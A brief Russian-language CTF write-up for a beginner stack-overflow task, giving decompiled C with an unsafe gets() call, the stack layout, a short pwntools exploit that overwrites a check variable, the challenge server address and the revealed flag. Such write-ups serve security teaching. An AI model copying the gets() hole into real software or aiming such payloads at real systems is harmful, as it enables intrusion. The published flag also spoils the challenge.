[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn1_mc6)
Описание: Переполните, чтобы получить флаг.
nc 109.233.56.90 11586
Прикреплён: mc6_censored (elf file).

Необходимо заполнить буфер + 8 байт отступа, затем ввести упакованную строку 13371337.
``` C
void __fastcall main(int argc, const char **argv, const char **envp)
{
  char userInput[32]; // [rsp+10h] [rbp-30h] BYREF
  int checkNo; // [rsp+38h] [rbp-8h]
  int v5; // [rsp+3Ch] [rbp-4h]

  v5 = 0;
  checkNo = 666;
  printf("Give me your input: ");
  gets(userInput, argv);

  printf("The check number is %d\n", checkNo);
  if ( checkNo == 13371337 )
    printf("Flag is: spbctf{********************************}\n");
  else
    printf("Bad luck!\n");
}
```

``` stack
-0000000000000030         char userInput[32];
-0000000000000010         // padding byte
-000000000000000F         // padding byte
-000000000000000E         // padding byte
-000000000000000D         // padding byte
-000000000000000C         // padding byte
-000000000000000B         // padding byte
-000000000000000A         // padding byte
-0000000000000009         // padding byte
-0000000000000008         int checkNo;
```


Эксплоит:
``` python
io = start()

payload = b'A' * 40 + p32(13371337)
io.sendline(payload)

io.interactive()
```

Запуск:
![{76122BA2-97D0-4EBF-8B43-9FE0F50D1CF7}](../../../../z.%20Images/{76122BA2-97D0-4EBF-8B43-9FE0F50D1CF7}.png)

Ответ: `spbctf{s4v3d_the_w0rld_fr0M_HELL}`